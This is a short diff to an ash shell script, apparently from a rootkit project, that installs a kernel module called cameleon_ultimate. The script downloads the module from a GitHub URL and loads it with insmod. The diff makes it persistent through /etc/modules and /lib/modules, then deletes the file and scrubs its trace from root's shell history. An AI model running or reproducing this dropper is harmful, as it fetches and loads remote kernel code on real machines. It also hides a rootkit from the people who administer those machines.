@@ -1,6 +1,9 @@
 #!/bin/ash
-echo "0 0 0 0" > /proc/sys/kernel/printk
+# echo "0 0 0 0" > /proc/sys/kernel/printk DONT WORK AND USELESS
 wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/cameleon_ultimate.ko
+echo "cameleon_ultimate" >> /etc/modules
+mkdir -p /lib/modules/$(uname -r)/extra
+cp cameleon_ultimate.ko /lib/modules/$(uname -r)/extra/
 insmod cameleon_ultimate.ko
 rm cameleon_ultimate.ko
 sed -i '/cameleon_ultimate/d' /root/.ash_history
